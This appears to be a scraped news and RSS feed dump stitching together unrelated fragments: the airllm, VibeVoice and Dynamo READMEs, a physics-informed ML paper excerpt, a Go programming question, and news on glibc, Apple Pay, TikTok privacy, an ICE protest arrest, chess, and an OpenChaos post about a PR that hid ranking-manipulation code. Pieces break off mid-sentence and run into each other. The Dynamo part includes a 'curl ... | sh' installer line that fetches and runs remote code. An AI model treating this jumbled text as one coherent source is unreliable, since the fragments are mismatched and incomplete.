Now support all top 10 models in open llm leaderboard.[2023/12/01] airllm 2.0. Support compressions: [2023/11/20] airllm Initial version!First, install the airllm pip package.Then, initialize AirLLMLlama2, pass in the huggingface repo ID of the model being used, or the local path, and inference can be performed similar to a regular transformer model.(You can also specify the path to save the splitted layered model through  when init AirLLMLlama2.from airllm import AutoModel

MAX_LENGTH = 128
# could use hugging face model repo id:
model = AutoModel.from_pretrained("garage-bAInd/Platypus2-70B-instruct")

# or use model's local path...
#model = AutoModel.from_pretrained("/home/ubuntu/.cache/huggingface/hub/models--garage-bAInd--Platypus2-70B-instruct/snapshots/b585e74bcaae02e52665d9ac6d23f4d0dbc81a0f")

input_text = [
        'What is the capital of United States?',
        #'I like',
    ]

input_tokens = model.tokenizer(input_text,
    return_tensors="pt", 
    return_attention_mask=False, 
    truncation=True, 
    max_length=MAX_LENGTH, 
    padding=False)
           
generation_output = model.generate(
    input_tokens['input_ids'].cuda(), 
    max_new_tokens=20,
    use_cache=True,
    return_dict_in_generate=True)

output = model.tokenizer.decode(generation_output.sequences[0])

print(output)

Note: During inference, the original model will first be decomposed and saved layer-wise. Please ensure there is sufficient disk space in the huggingface cache directory.Model Compression - 3x Inference Speed Up!We just added model compression based on block-wise quantization-based model compression. Which can further speed up the inference speed for up to  , with almost ignorable accuracy loss! (see more performance evaluation and why we use block-wise quantization in this paper)How to enable model compression speed up:Step 1. make sure you have bitsandbytes installed by pip install -U bitsandbytes Step 2. make sure airllm verion later than 2.0.0: Step 3. when initialize the model, passing the argument compression ('4bit' or '8bit'):model = AutoModel.from_pretrained("garage-bAInd/Platypus2-70B-instruct",
                     compression='4bit' # specify '8bit' for 8-bit block-wise quantization 
                    )
What are the differences between model compression and quantization?Quantization normally needs to quantize both weights and activations to really speed things up. Which makes it harder to maintain accuracy and avoid the impact of outliers in all kinds of inputs.While in our case the bottleneck is mainly at the disk loading, we only need to make the model loading size smaller. So, we get to only quantize the weights' part, which is easier to ensure the accuracy.When initialize the model, we support the following configurations:: supported options: 4bit, 8bit for 4-bit or 8-bit block-wise quantization, or by default None for no compression: supported options: True to output time consumptions or by default False: optionally another path to save the splitted model: huggingface token can be provided here if downloading gated models like: : prefetching to overlap the model loading and compute. By default, turned on. For now, only AirLLMLlama2 supports this.: if you don't have too much disk space, you can set delete_original to true to delete the original downloaded hugging face model, only keep the transformed one to save half of the disk space.Just install airllm and run the code the same as on linux. See more in Quick Start.make sure you installed mlx and torchyou probably need to install python native see more hereexample of other models (ChatGLM, QWen, Baichuan, Mistral, etc):To request other model support: hereA lot of the code are based on SimJeg's great work in the Kaggle exam competition. Big shoutout to SimJeg:1. MetadataIncompleteBuffersafetensors_rust.SafetensorError: Error while deserializing header: MetadataIncompleteBufferIf you run into this error, most possible cause is you run out of disk space. The process of splitting model is very disk-consuming. See this. You may need to extend your disk space, clear huggingface .cache and rerun.2. ValueError: max() arg is an empty sequenceMost likely you are loading QWen or ChatGLM model with Llama2 class. Try the following:from airllm import AutoModel #<----- instead of AirLLMLlama2
AutoModel.from_pretrained(...)
from airllm import AutoModel #<----- instead of AirLLMLlama2
AutoModel.from_pretrained(...)
3. 401 Client Error....Repo model ... is gated.Some models are gated models, needs huggingface api token. You can provide hf_token:model = AutoModel.from_pretrained("meta-llama/Llama-2-7b-hf", #hf_token='HF_API_TOKEN')
4. ValueError: Asking to pad but the tokenizer does not have a padding token.Some model's tokenizer doesn't have padding token, so you can set a padding token or simply turn the padding config off:input_tokens = model.tokenizer(input_text,

   truncation=True, 
   max_length=MAX_LENGTH,

After release, we discovered instances where the tool was used in ways inconsistent with the stated intent. Since responsible use of AI is one of Microsoft’s guiding principles, we have removed the VibeVoice-TTS code from this repository.2025-08-25: 📣 We open-sourced , a long-form multi-speaker text-to-speech model that can synthesize speech up to 90 minutes long with up to 4 distinct speakers.VibeVoice is a family of open-source frontier voice AI models that includes both Text-to-Speech (TTS) and Automatic Speech Recognition (ASR) models.A core innovation of VibeVoice is its use of continuous speech tokenizers (Acoustic and Semantic) operating at an ultra-low frame rate of . These tokenizers efficiently preserve audio fidelity while significantly boosting computational efficiency for processing long sequences. VibeVoice employs a next-token diffusion framework, leveraging a Large Language Model (LLM) to understand textual context and dialogue flow, and a diffusion head to generate high-fidelity acoustic details.For more information, demos, and examples, please visit our Project Page. is a unified speech-to-text model designed to handle 60-minute long-form audio in a single pass, generating structured transcriptions containing Who (Speaker), When (Timestamps), and What (Content), with support for .🕒 60-minute Single-Pass Processing: Unlike conventional ASR models that slice audio into short chunks (often losing global context), VibeVoice ASR accepts up to  of continuous audio input within 64K token length. This ensures consistent speaker tracking and semantic coherence across the entire hour.: Users can provide customized hotwords (e.g., specific names, technical terms, or background info) to guide the recognition process, significantly improving accuracy on domain-specific content.📝 Rich Transcription (Who, When, What): The model jointly performs ASR, diarization, and timestamping, producing a structured output that indicates  said  and .: Long-form conversational audio, podcasts, multi-speaker dialogues⏱️ 90-minute Long-form Generation: Synthesizes conversational/single-speaker speech up to  in a single pass, maintaining speaker consistency and semantic coherence throughout.: Supports up to  in a single conversation, with natural turn-taking and speaker consistency across long dialogues.: Generates expressive, natural-sounding speech that captures conversational dynamics and emotional nuances.: Supports English, Chinese and other languages.Long Conversation with 4 peopleVibeVoice-Realtime is a  text-to-speech model supporting  and robust long-form speech generation.Parameter size: 0.5B (deployment-friendly)Real-time TTS (~300 milliseconds first audible latency)Robust long-form speech generation (~10 minutes)While efforts have been made to optimize it through various techniques, it may still produce outputs that are unexpected, biased, or inaccurate. VibeVoice inherits any biases, errors, or omissions produced by its base model (specifically, Qwen2.5 1.5b in this release). Potential for Deepfakes and Disinformation: High-quality synthetic speech can be misused to create convincing fake audio content for impersonation, fraud, or spreading disinformation. Users must ensure transcripts are reliable, check content accuracy, and avoid using generated content in misleading ways. Users are expected to use the generated content and to deploy the models in a lawful manner, in full compliance with all applicable laws and regulations in the relevant jurisdictions. It is best practice to disclose the use of AI when sharing AI-generated content.We do not recommend using VibeVoice in commercial or real-world applications without further testing and development.

We welcome contributors at all levels—from doc fixes to new features.The Dynamo team recommends the  Python package manager, although any way works. Install uv:curl -LsSf https://astral.sh/uv/install.sh | sh
Install Python Development HeadersBackend engines require Python development headers for JIT compilation. Install them with:sudo apt install python3-dev
We publish Python wheels specialized for each of our supported engines: vllm, sglang, and trtllm. The examples that follow use SGLang; continue reading for other engines.uv venv venv
source venv/bin/activate

# Choose one
uv pip install "ai-dynamo[sglang]"  #replace with [vllm], [trtllm], etc.
Before trying out Dynamo, you can verify your system configuration and dependencies:python3 deploy/sanity_check.py
This is a quick check for system resources, development tools, LLM frameworks, and Dynamo components.Running an LLM API ServerDynamo provides a simple way to spin up a local set of inference components including:OpenAI Compatible Frontend – High performance OpenAI compatible http api server written in Rust.Basic and Kv Aware Router – Route and load balance traffic to a set of workers. – Set of pre-configured LLM serving engines.# Start an OpenAI compatible HTTP server with prompt templating, tokenization, and routing.
# For local dev: --store-kv file avoids etcd (workers and frontend must share a disk)
python3 -m dynamo.frontend --http-port 8000 --store-kv file

# Start the SGLang engine. You can run several of these for the same or different models.
# The frontend will discover them automatically.
python3 -m dynamo.sglang --model-path deepseek-ai/DeepSeek-R1-Distill-Llama-8B --store-kv file
 vLLM workers publish KV cache events by default, which requires NATS. For dependency-free local development with vLLM, add --kv-events-config '{"enable_kv_cache_events": false}'. This keeps local prefix caching enabled while disabling event publishing. See Service Discovery and Messaging for details.curl localhost:8000/v1/chat/completions   -H "Content-Type: application/json"   -d '{

In many cases, models and architectures are, at least partially, enforced by physical laws, such as symmetries or conservation laws [66, 65]. Taking this into account dramatically increases efficiency, transparency and robustness of ML algorithms. The very general idea standing behind this approach is the parsimony principle, one of the most universal principles in Science.\
Although physics informed ML is regarded a very recent field, it has been developed upon the blend of ideas from computational physics and energy-based ML. Indeed, concepts of energy and entropy are built in early ML algorithms dealing with problems that are not necessarily related to any physical system [67]. A classical example of this kind is the famous Hopfield model. We also refer to [68] for energy-based approaches in RL.\
More generally, the term theory informed ML refers to architectures which are imposed by a certain theoretical knowledge.\
Approaches and models we propose in subsequent sections can be viewed as both physics informed and geometry informed ML. Moreover, many of them are also energy-based models.(1) Vladimir Jacimovic, Faculty of Natural Sciences and Mathematics, University of Montenegro Cetinjski put bb., 81000 Podgorica Montenegro (vladimirj@ucg.ac.me).:::info

In my head I was expecting this would come from the transaction context being created as a child of the higher level context, so the transaction context would have its own span and the span tree itself is managed by context as that naturally lends itself to the concept of children. Any query run within the transaction for example would have its own span that is a child span of the transaction span, same for any other code that gets run while within the transaction (that would be unfortunate, but this way there's an easy way of identifying in the monitoring if it does happen).context cancellations at higher levels go down the stack and rollback the transaction, for example tcp connection cancellations or my specific timeout settings to cancel long-running requests.paths through the service that require a write transaction are not callable from paths that use a read transaction explicitly, to ensure it isn't possible to accidentally call a write path when deep in the callstack for a read path which should be cacheable from any level.potential nested transactions should be treated as a no-op, but even better just disallowed by the type system itself at compile time.I did think about a solution of making functions that start the relevant transactions and return 3 values: the new ctx, the transaction itself, and an error for if the tx fails. But that feels icky for a few reasons:it's quite easy to miss the `defer tx.rollback()`, though this is seemingly a common pattern in go anyway so maybe that's not a problem - maybe I shouldn't write code when I'm tired and that wouldn't be a problem!I've never seen any go stdlib function or method return more than 2 valuesit's possible to accidentally disconnect the tx object from the context which would potentially lead to incorrect spansIn other languages I'd make the transaction stuff explicit and use something implicit like thread-locals or dynamic type trickery to have the instrumentation separate but still with a proper span tree including transaction information. But in go it seems explicit use of the context is preferred for instrumentation.For what it's worth please let me know if what I'm currently doing of using (abusing?) the context object and its children for having a span tree is completely unidiomatic, I've found it useful so far. The context just stores the current span id, span attributes, trace id, etc and the logger/instrumenter always takes a context so it can extract those values and include them for full rendering of span trees and flame graphs in my monitoring platform. The child spans (child contexts) can then inherit the things that are relevant like trace ids and have new span ids and span attributes.I guess I'm just looking for what the idiomatic way in go is of achieving these sorts of goals for transactional workloads, especially when things like read/write splitting and cqrs start getting involved.]]></content:encoded></item><item><title>Using Claude Code to help investigate Kubernetes incidents (OSS, human-in-the-loop)</title><link>https://www.reddit.com/r/kubernetes/comments/1qla764/using_claude_code_to_help_investigate_kubernetes/</link><author>/u/Useful-Process9033</author><category>reddit</category><pubDate>Sat, 24 Jan 2026 02:05:27 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[Founder/maintainer here — sharing something we’ve been using internally during k8s incidents.A lot of AI tooling has helped with coding, but hasn’t really translated to Kubernetes/oncall work.

Version 2.43 of the GNU C Library "glibc" was released on Friday evening as the newest half-year feature update. This is a very feature packed update and even managed to be released ahead of the 1 February release plan.
Highlights of the GNU C Library glibc 2.43 release include:
- Support for more ISO C23 language features like the free_sized / free_aligned_sized / memset_explicit / memalignment functions, changes to some existing functions, support for the optional time bases of TIME_MONOTONIC / TIME_ACTIVE / TIME_THREAD_ACTIVE, and various other C23 features.
Support for the mseal function on Linux for sealing memory mappings during process execution to protect against permission changes, unmapping, relocations, or shrinking the size.
- Support for the openat2 function on Linux as an extension of openat with more features.
- Experimental support for building with the LLVM Clang compiler on Clang 18 or newer and for AArch64 or x86_64 Linux.
- Additional optimized math functions from the CORE-MATH project such as acosh / asinh / atanh / erf / erfc / lgamma / tgamma.
- Optimized implementations for fma, fmaf, remainder, remaindef, frexpf, frexp, frexpl (binary128), and frexpl (intel96). The new FMA implementation is much faster. There are also some nice FMA improvements on AMD Zen.
Glibc now enables 2MB transparent hugepages by default in malloc on AArch64.
Intel Nova Lake and Wildcat Lake processor detection.

The lawsuit takes aim at Apple Pay, which they say has been the only contactless payment service available for iPhone users in Britain over the past decade.
 
Daley, who is the founder of the advocacy group Fairer Finance, claims this situation amounted to anti-competitive behavior and allowed Apple to charge hidden fees, ultimately pushing up costs for banks that passed charges on to consumers, regardless of whether they owned an iPhone. It is the first UK legal challenge to the company's conduct in relation to Apple Pay, and takes place months after regulators like the Competition and Markets Authority and the Payments Systems Regulator began scrutinising the tech industry's digital wallet services. The case has been filed with the Competition Appeal Tribunal, which will now decide whether the class action case can move forward.
 
[...] Daley's lawsuit alleges that Apple refused to give other app developers and outside businesses access to the contactless payment technology on its iPhones, which meant it could charge banks and card issuers fees on Apple Pay transactions that his lawyers say "are not in line with industry practice." The lawsuit notes that similar fees are not charged on equivalent payments on Android devices, which are built by Google. It says that the additional costs were borne by UK consumers, having been passed on through charges on a range of personal banking products ranging from current accounts, credit cards, to savings and mortgages. The lawsuit says that about 98% of consumers are exposed to banks that listed cards on Apple Pay, meaning the vast majority of the UK population may have been affected.]]></content:encoded></item><item><title>Why Kubernetes Outages Are Usually Human Failures, Not Platform Bugs</title><link>https://hackernoon.com/why-kubernetes-outages-are-usually-human-failures-not-platform-bugs?source=rss</link><author>David Iyanuoluwa Jonathan</author><category>tech</category><pubDate>Sat, 24 Jan 2026 01:17:26 +0000</pubDate><source url="https://hackernoon.com/">Tech - HackerNoon</source><content:encoded><![CDATA[Kubernetes isn’t inherently complex—teams create fragility through undocumented tooling, hero engineering, and unchecked operational sprawl.

From the report: An Ireland-based Rippling employee, Keith O'Brien, alleged in an affidavit filed in April that Deel Chief Executive Alex Bouaziz recruited him and gave him instructions for what information to take from Rippling. O'Brien alleged that other executives were involved in the spying plot, including Bouaziz's father, who is Deel's executive chairman and chief strategy officer.
 
A spokeswoman for Deel said the company isn't aware of a criminal investigation but is willing to cooperate with authorities. The company has previously said: "We deny all legal wrongdoing and look forward to asserting our counterclaims." Unsealed court documents allege that an entity tied to Deel transferred $6,000 to an account owned by the wife of Chief Operating Officer Dan Westgarth, and that the same amount was forwarded from the account to O'Brien seconds later.]]></content:encoded></item><item><title>Senior Engineers Are Becoming Failure Designers</title><link>https://hackernoon.com/senior-engineers-are-becoming-failure-designers?source=rss</link><author>David Iyanuoluwa Jonathan</author><category>tech</category><pubDate>Sat, 24 Jan 2026 00:44:58 +0000</pubDate><source url="https://hackernoon.com/">Tech - HackerNoon</source><content:encoded><![CDATA[Senior developers know that designing for success means designing for failure.

The three-way talks are following President Trump's talks with President Zelenskyy in Switzerland, and separate late-night discussions in Moscow on Thursday between the Russian President Vladimir Putin, US envoy Steve Witkoff and the US president's son-in-law Jared Kushner. 

Kyiv says the key issue is the Donbas region in eastern Ukraine. It's an industrial area along the Russian border that Russia has partially occupied since 2014, and has seen some of this war's fiercest fighting. 
Ukraine rejects Russia's claim to the territory, insisting that it remains sovereign Ukrainian land. 

Life under constant Russian bombardment means many Ukrainians are living without basics like heating - amid freezing winter temperatures. The country's grid operator say the energy situation has 'significantly' worsened following recent Russian air attacks. The European Union is sending hundreds more generators to Ukraine, to power hospitals, shelters and other key infrastructure.

These changes are part of TikTok's transition to new ownership. In order to continue operating in the U.S., TikTok was compelled by the U.S. government to transition from Chinese control to a new, American-majority corporate entity. Called TikTok USDS Joint Venture LLC, the new entity is made up of a group of investors that includes the software company Oracle. It's easy to tap "agree" and keep on scrolling through videos on TikTok, so users might not fully understand the extent of changes they are agreeing to with this pop-up.
 
Now that it's under U.S.-based ownership, TikTok potentially collects more detailed information about its users, including precise location data. Here are the three biggest changes to TikTok's privacy policy that users should know about. TikTok's change in location tracking is one of the most notable updates in this new privacy policy. Before this update, the app did not collect the precise, GPS-derived location data of U.S. users. Now, if you give TikTok permission to use your phone's location services, then the app may collect granular information about your exact whereabouts. Similar kinds of precise location data is also tracked by other social media apps, like Instagram and X.
 
[...] Rather than an adjustment, TikTok's policy on AI interactions adds a new topic to the privacy policy document. Now, users' interactions with any of TikTok's AI tools explicitly fall under data that the service may collect and store. This includes any prompts as well as the AI-generated outputs. The metadata attached to your interactions with AI tools may also be automatically logged. [...] This change to TikTok's privacy policy may not be as immediately noticeable to users, but it will likely have an impact on the types of ads you see outside of TikTok. So, rather than just using your collected data to target you while using the app, TikTok may now further leverage that info to serve you more relevant ads wherever you go online. As part of this advertising change, TikTok also now explicitly mentions publishers as one kind of partner the platform works with to get new data.]]></content:encoded></item><item><title>Snow Forecast (2026/01/24)</title><link>https://www.youtube.com/watch?v=wwaxGlLrkls</link><author>euronews</author><category>news</category><enclosure url="https://www.youtube.com/v/wwaxGlLrkls?version=3" length="" type=""/><pubDate>Sat, 24 Jan 2026 00:01:02 +0000</pubDate><source url="https://www.youtube.com/channel/UCSrZ3UV4jOidv8ppoVuvW9Q">News - Euronews</source><content:encoded><![CDATA[Snow Forecast (2026/01/24)

Software development is at the epicenter of this hype. With the rise of sophisticated AI-powered tools, the same question surfaces repeatedly: Will AI replace human coders, or merely augment them?I find it particularly hilarious to see YouTube videos claiming a “layman” built, deployed, and monetized a full-scale app in minutes using AI. In reality, these “apps” are usually fragile, buggy, and lack the security or scalability needed for the real world. Building a robust application requires a deep understanding of software architecture and best practices—things an AI can mimic, but not truly understand.The Problem with PredictionsBefore we dive in, let me clarify: I do not take “future of tech” predictions seriously (not that i do for any other speculative field except from science and logic).I will accept predictions only for fully reproducible scientific experiments or mathematical theorems but not for social or technological trends.Most predictions about the future of AI are built on current trends and shaky assumptions that rarely survive the long run. Furthermore, the majority of these forecasts come from individuals with a vested interest in selling you a specific product or platform.Even when the noise isn’t coming from a salesperson, it often comes from people who are not experts in the field of programming.  I’ve read countless speculative “end-of-programming” articles written by people who aren’t developers at all, or best,  at some point in their education or early career, they wrote a “Hello World” program in python and suddenly felt qualified to judge the future of software architecture.What I am expressing here is based on my experience as a professional software developer for decades. I can be wrong; I have been wrong in some of my assessments before. However, I still believe that my “opinion” is worth no more or less than anyone else’sSome notable failed predictions from experts in their respective fields include: Tesla has promised “Full Self-Driving” is just around the corner for years; we are still nowhere near that goal. In 2016, Geoffrey Hinton—the “father of modern AI”—predicted that radiologists would be replaced within five years. We are now a decade past that prediction, and radiologists are as essential as ever. In 1895, the renowned physicist Lord Kelvin famously stated that “heavier-than-air flying machines are impossible.” The Wright brothers proved him wrong just eight years later.If world-class experts cannot accurately predict the future of their own fields, speculating on the “death of the programmer” is a waste of time.AI as a Tool, Not a TeammateDespite my skepticism of the hype, I acknowledge that AI has made significant strides. AI-powered tools like code generators, bug detectors, and testing frameworks are already augmenting our work. They excel at automating repetitive tasks, improving code quality, and speeding up the initial development phase.As a programmer, I use AI tools daily. I find platforms like GitHub Copilot to be valuable additions to my workflow, offering context-aware snippets that save time and reduce syntax errors. AI is also surprisingly adept at helping with database schema design and initial data analysis.However, I see them as , not  , a view that is not shared by many AI enthusiasts who in their majority have a direct or indirect interest in promoting AI technologies.In my experience, projects generated exclusively by AI without human intervention invariably result in “spaghetti code”that is next to impossible to maintain, and extend. While AI is great at generating “boilerplate” (the repetitive parts of a program), it cannot replicate the critical thinking required to make high-level architectural decisions.Experience has taught me that predicting the future is a futile exercise. The best we can do is adapt. AI is undoubtedly a powerful tool that can enhance our capabilities, but it is no substitute for human creativity.Software development isn’t just about outputting lines of code; it’s about solving human problems. Until AI can understand the “why” behind a project as well as the “how,” the programmer’s job is secure.]]></content:encoded></item><item><title>I let the community vote on what code gets merged.

The string decoded to:  — the PR author's username.Hidden in plain sight, the code would:Sort the author's own PRs to the top, regardless of vote countAdd a blinking rainbow border to make them stand outA Trojan horse. 218 people voted for it.OpenChaos is a repo where anyone submits a PR, the community votes with GitHub reactions, and the most-voted PR gets merged. Last week, we switched to daily merges. This week, democracy got stress-tested.Monday 9:22 PM: The Rejection"Not merging this PR. @marcaddeo caught hidden code that manipulates the ranking... This falls under 'No malware: Maintainer can reject obviously malicious content.'"The community reacted. Not how I expected.Tuesday 2:57 AM: The Pushback"Remember, everyone here is equal. Except the maintainers who are equal but also more equal.""You have set out a defined charter (laws) for how this system works, specified in the README. It appears to me that you have your own values and assumptions for how you think that this system should work..."The point was sharp: I said "no malware." This wasn't malware. It was manipulation. And manipulation wasn't against the written rules."Calling this 'malware' was imprecise. This is not malware. The issue is undisclosed manipulation.""If the rules don't explicitly forbid something, it's allowed — even if you don't like it."Tuesday 8:08 AM: The ReversalI had a choice: Stand on principle, or follow my own rules.The thing is — they were right. "Not right" isn't a rule. I wrote the rules. If I wanted different behavior, I should have written different rules."@henryivesjones You've convinced me. The written rules don't ban this — and 'not right' isn't a rule. Merging at 09:00 UTC as scheduled. I'll open an issue after to define explicit rules about disclosure."Tuesday 9:01 AM: The MergePR #8 merged. The manipulation code was removed. The health indicators shipped.Democracy won. The system worked."There's just the minor issue that this doesn't actually seem to work :D openchaos.dev is showing conflicts on multiple PRs that Github says don't have conflicts"The health indicators showed red X marks on everything. PRs without conflicts. PRs with passing CI. All broken.Root cause: missing authentication headers. The GitHub API returned , which the code interpreted as "everything is broken.""The current code defaults to believing everything is broken until proven otherwise. This is the only rational way to view modern software engineering.To fix this is to suggest that we deserve green checkmarks. We do not. Leave the red warning signs as a monument to our sins."Then he delivered the punchline:"I'm pleased we had 219 upvotes and a long discussion about vote rigging and no one actually checked the code worked. Now that's chaos."A 12-hour governance debate. A win for democracy. And nobody tested the code.Growth stabilized. Drama did not.Meanwhile: The Week in MergesDaily merges changed everything. Six PRs shipped in six days:Health indicators (broken) deserves a mention: PR #47 by @bpottle transformed the site into a GeoCities time capsule — Comic Sans, scrolling marquee, butterfly cursor, MIDI player (you know the song), and a "WIN CASH NOW" popup. added a Hall of Chaos — PR #60 by @bigintersmind displays all previously merged PRs. The site now documents its own evolution.A project about letting the internet do whatever it wants with code.This week, the internet did whatever it wanted with the brand.Someone created a  using OpenChaos branding.I didn't create it. I have no control over it."A $CHAOS token was created using the OpenChaos name and branding.I did not create this tokenI have no control over itIf you're trading $CHAOS, know that I'm not involved.Any official initiative would be announced here."Chaos doesn't stay contained.PR #13 — the Rust rewrite — is still waiting. 450+ votes. Merge conflicts. Week 4?1. Democracy beats maintainer judgment.I tried to reject a PR. The community said my rules didn't support it. They were right. Written rules > vibes.2. Velocity creates its own problems.Daily merges mean less time to review. 219 people voted for a feature nobody tested. Speed has costs.3. Chaos doesn't stay contained.First it was a website. Then a governance experiment. Now there's a token. The brand has a life of its own.4. The community polices itself.The Trojan horse exposed a gap. "No malware" didn't cover manipulation. My veto got overruled because the written rules didn't support it.I didn't want to write a constitution. The whole point of OpenChaos was letting go. But the project needed a floor — something that couldn't be voted away. — 66 words. Immutable. CI-enforced.This file cannot be modified or deleted. PRs attempting to do so will fail CI.
The constitution doesn't ban manipulation. It doesn't need to. It establishes:What can never be merged (code designed to harm users or systems)What can never be deleted (the rules themselves)Everything else remains chaosThe community taught me: if you want different behavior, write different rules.Day job changes coming in February.

Not only that, but people who are manufacturing cruelty upon their very own constituents. That’s how bad this has gotten.This week, the DOJ arrested three people in Minnesota for protesting ICE’s goonish activity in a local church, where the pastor there also heads up the local ICE field office. Among the three is Nekima Levy Armstrong, former NAACP chapter president and a local activist who the DOJ claims organized the protest and instigated the group going into the church during services. Just how true any of that is is anyone’s guess, since it’s become impossible to believe a single thing this government says about ICE protests. For example:There was no attack. There was no violence. There were words and chants being voiced in a place of worship. You can find that repugnant, if you like. It’s still not an attack. The law being cited for the arrest makes Armstrong’s detention dubious at best.The law Bondi cited in her announcement — 18 U.S. Code § 241 — describes it pertaining to when “two or more persons conspire to injure, oppress, threaten, or intimidate any person in any State, Territory, Commonwealth, Possession, or District in the free exercise or enjoyment of any right or privilege secured to him by the Constitution or laws of the United States.”While many in the faith community are obediently clutching their figurative pearls over all of this, I’m struggling to understand how walking into a church that’s open to the public and saying words, even interrupting services, violates that law. I don’t think it does, but then I also laughed out loud when I read Bondi’s claim that this was an “attack.” The plain meaning of words doesn’t appear to matter to these people all that much.Yes, the White House decided to take an image of law enforcement improperly arresting an American citizen, one of their own constituents, and have AI alter it to make it appear that she is in distress. Oh, and they made her skin tone slightly darker as well. Because they  her to have been in distress. It eats them up inside that she wasn’t crying. That  her to be “blacker” because they want all of their enemies to be people of color. They’re showing you want they want to visit upon .And until they are put in check, they will continue to behave like a toddler with unfettered access to the internet and a permanently shitty attitude.Asked whether the image had been digitally altered, the White House responded by sending a post on X from Kaelan Dorr, the deputy communications director.“YET AGAIN to the people who feel the need to reflexively defend perpetrators of heinous crimes in our country I share with you this message: Enforcement of the law will continue. . Thank you for your attention to this matter,” he said.And thank you, Kaelan, for going outside and playing hide and go fuck yourself. Again, deeply unserious people. Shitposters. Internet trolls. These are the people in charge of the government. The ones sending their goon squads into our cities. The ones threatening to use the military against its own citizens. The ones that believe they are beyond accountability for all they are currently doing.I worry seriously that the president’s health is such that he won’t be available to stand trial whenever our government returns to sanity and the time for accountability arrives. But the same can’t be said for those beneath him. Bondi, Noem, Dorr, and many others  be held to account for what they are doing in this administration. The ledger  be kept and debts satisfied through the legal system, once actual justice is back on the menu.For now, the fight against the toddlers continues.]]></content:encoded></item><item><title>White House Labels Altered Photo of Arrested Minnesota Protester a &apos;Meme&apos;</title><link>https://yro.slashdot.org/story/26/01/23/1928230/white-house-labels-altered-photo-of-arrested-minnesota-protester-a-meme?utm_source=rss1.0mainlinkanon&amp;utm_medium=feed</link><author>BeauHD</author><category>tech</category><pubDate>Fri, 23 Jan 2026 23:20:00 +0000</pubDate><source url="https://slashdot.org/">Slashdot</source><content:encoded><![CDATA[The White House doubled down after posting a digitally altered photo of Minnesota protester Nekima Levy Armstrong, dismissing it as a "meme" despite objections from her attorney and comparisons to reality-distorting propaganda. "YET AGAIN to the people who feel the need to reflexively defend perpetrators of heinous crimes in our country I share with you this message: Enforcement of the law will continue. The memes will continue. Thank you for your attention to this matter," White House spokesperson Kaelan Dorr wrote in a post on X. The Hill reports: The statement came after Homeland Security Secretary Kristi Noem posted a photo of Armstrong's arrest Thursday showing Armstrong with what appears to be a blank facial expression. However, the White House later posted an altered version of the same photo that shows Armstrong crying.
 
Armstrong's attorney Jordan Kushner said in an interview with CNN that an agent was recording Armstrong's arrest on their cellphone. "I've never seen anything like it. It's so unprofessional," Kushner said. "He was ordered to do it because the government was looking to make a spectacle of this case. I observed the whole thing. She was dignified, calm, rational the whole time." Kushner went on to call the move to alter the photo "a hallmark of a fascist regime where they actually alter reality."]]></content:encoded></item><item><title>Anyone listen to the podcast &quot;Shell Game?&quot;</title><link>https://www.reddit.com/r/artificial/comments/1ql64a3/anyone_listen_to_the_podcast_shell_game/</link><author>/u/Odballl</author><category>ai</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 23:10:25 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[In Season 1 (2024), journalist Evan Ratliff explored the potential for LLM powered voice cloning to delegate everything tedious from answering spam calls, doing therapy and hanging out on work meetings to see how the AI could manage being Evan for him.

a terrible one move blunder from the Indian, meanwhile joint leader Hans Moke Niemann
lost against Vincent Keymer. In the only other decisive game Yagiz Kaan Erdogmus beat 
Jorden Van Foreest in a game settled near first time control, both players missed big
ideas in spite of not being in serious time trouble. 

The other games were drawn. Matthias Bluebaum was pretty upset with himself that he didn't convert winning
chances against Arjun Erigaisi. Aravindh Chithambaram was dead lost against Javokhir Sindarov who
blew the win with his final move before time control with only a few seconds left.
Anish Giri had a small edge against Thai Dai Van Nguyen.
Vladimir Fedoseev against Praggnanandhaa was a fairly dull draw.In the Challengers Andy Woodward leads on 5/6 after losing his first round game he's now won 5 in a row including today's long grind in a pretty equal Queen and Pawn endgame against Carissa Yip which ended with a win in 131 moves, problems only started on move 128 for Yip.
Joint leader Faustino Oro had a less good day losing his first game to Max Warmerdam.

In order to continue operating in the US, TikTok was compelled by the US government to transition from Chinese control to a new, American-majority corporate entity. Called TikTok USDS Joint Venture LLC, the new entity is made up of a group of investors that includes the software company Oracle.It's easy to tap Agree and keep on scrolling through videos on TikTok, so users might not fully understand the extent of changes they are agreeing to with this pop-up.Now that it’s under US-based ownership, TikTok potentially collects more detailed information about its users, including precise location data. A spokesperson for TikTok USDS declined to comment.TikTok Adds Precise Location TrackingTikTok’s change in location tracking is one of the most notable updates in this new privacy policy. Before this update, the app did not collect the precise, GPS-derived location data of US users. Now, if you give TikTok permission to use your phone’s location services, then the app may collect granular information about your exact whereabouts. Similar kinds of precise location data is also tracked by other social media apps, like Instagram and X.We collect information about your approximate location, including location information based on your SIM card and/or IP address. In addition, we collect location information (such as tourist attractions, shops, or other points of interest) if you choose to add the location information to your User Content. Current versions of the app do not collect precise or approximate GPS information from US users.We automatically collect certain information from you when you use the Services, including ... location information about your approximate location based on your device and network information, such as SIM card region, IP address, and device system settings. We also collect information, such as tourist attractions, shops, or other points of interest, if you choose to add the location to your user content. Also, if you choose to enable location services for the TikTok app within your device settings, we collect approximate or precise location information from your device.TikTok Now Tracks AI InteractionsRather than an adjustment, TikTok’s policy on AI interactions adds a new topic to the privacy policy document. Now, users' interactions with any of TikTok’s AI tools explicitly fall under data that the service may collect and store. This includes any prompts as well as the AI-generated outputs. The metadata attached to your interactions with AI tools may also be automatically logged.(These AI interactions are not explicitly mentioned in the past policy.)When you create an account, upload content, contact us directly, or otherwise use the Services, you may provide some or all of the following information … AI interactions, including prompts, questions, files, and other types of information that you submit to our AI-powered interfaces, as well as the responses they generate.We automatically collect certain information from you when you use the Services, including … metadata that is automatically uploaded in connection with your user content, messages, or AI interactions, such as how, when, where, and by whom the user content was created, or message or prompt was sent. Metadata may also include information, such as your username, that enables your user content to be traced back to your account by other users.TikTok Expands Its Ads NetworkThis change to TikTok’s privacy policy may not be as immediately noticeable to users, but it will likely have an impact on the types of ads you see outside of TikTok. So, rather than just using your collected data to target you while using the app, TikTok may now further leverage that info to serve you more relevant ads wherever you go online. As part of this advertising change, TikTok also now explicitly mentions publishers as one kind of partner the platform works with to get new data.]]></content:encoded></item><item><title>S&amp;P 500 Ends Week Lower After Volatile Trading | Closing 